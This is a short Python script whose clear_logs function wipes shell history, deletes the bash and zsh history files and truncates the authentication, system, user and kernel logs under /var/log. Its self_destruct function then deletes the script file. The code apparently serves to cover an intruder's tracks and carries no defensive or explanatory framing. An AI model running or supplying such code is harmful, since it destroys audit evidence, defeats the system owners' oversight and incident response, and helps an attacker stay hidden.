import os
import subprocess

def clear_logs():
    subprocess.run("history -c", shell=True)
    subprocess.run("rm ~/.bash_history ~/.zsh_history", shell=True)

    log_files = ["/var/log/auth.log", "/var/log/syslog", "/var/log/user.log", "/var/log/kern.log"]
    for log_file in log_files:
        with open(log_file, "w"):
            pass  # Clear log files

def self_destruct():
    os.remove(__file__)
